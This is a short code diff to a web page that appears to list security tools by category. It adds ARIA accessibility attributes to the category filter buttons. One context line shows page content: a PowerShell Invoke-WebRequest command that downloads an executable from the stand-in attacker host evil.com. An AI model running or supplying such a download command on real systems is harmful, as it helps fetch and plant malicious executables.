@@ -38,7 +38,7 @@
     </div>
 
     <!-- Category Filters -->
-    <div class="button-container search-container">
+    <div class="button-container search-container" role="group" aria-label="Filter Tools by Category">
         <button class="button filter-btn" data-cat="all" aria-pressed="true">All</button>
         <button class="button button-secondary filter-btn" data-cat="net" aria-pressed="false">Networking</button>
         <button class="button button-secondary filter-btn" data-cat="web" aria-pressed="false">Web</button>
@@ -420,9 +420,10 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     function setCategory(cat) {
         currentCategory = cat;
 
-        // Update Buttons
+        // Update Buttons and explicitly set aria-pressed state for accessibility
         filterBtns.forEach(btn => {
-            if (btn.getAttribute('data-cat') === cat) {
+            const isSelected = btn.getAttribute('data-cat') === cat;
+            if (isSelected) {
                 btn.classList.remove('button-secondary');
                 btn.classList.add('button');
                 btn.setAttribute('aria-pressed', 'true');
